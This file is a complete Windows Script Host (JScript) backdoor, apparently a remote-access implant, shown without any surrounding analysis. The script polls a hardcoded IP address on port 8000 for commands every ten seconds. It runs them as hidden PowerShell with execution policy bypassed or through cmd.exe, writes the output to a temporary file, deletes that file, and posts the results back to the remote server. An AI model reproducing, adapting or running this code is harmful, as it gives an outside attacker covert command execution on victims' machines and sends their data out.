var key = "k3x9Z";
var base = "http://185.205.187.109:8000/";
var out = "C:\\Users\\Public\\outputt2.txt";
var sh = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
function post(url, content) {
  var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
  h.Open("POST", url, false);
  h.Send(content + "()" + key);
  var t = h.ResponseText;
  return t.substring(1, t.length - 1);
}
var cmd = post(base + "X" + key, "hi");
while (true) {
  cmd = post(base + "X" + key, "poll");
  if (cmd.indexOf("function") == 0) {
    sh.Run("powershell -w hidden -ep bypass -c \"" + cmd + "\"", 0, false);
  } else if (cmd.indexOf("ssh") == 0) {
    sh.Run("cmd.exe /c " + cmd, 0, false);
  } else if (cmd.length > 0) {
    sh.Run("cmd.exe /c " + cmd + " > " + out, 0, true);
    var f = fso.OpenTextFile(out, 1);
    var res = f.ReadAll();
    f.Close();
    fso.DeleteFile(out);
    post(base + "X" + key, res);
  }
  WScript.Sleep(10000);
}
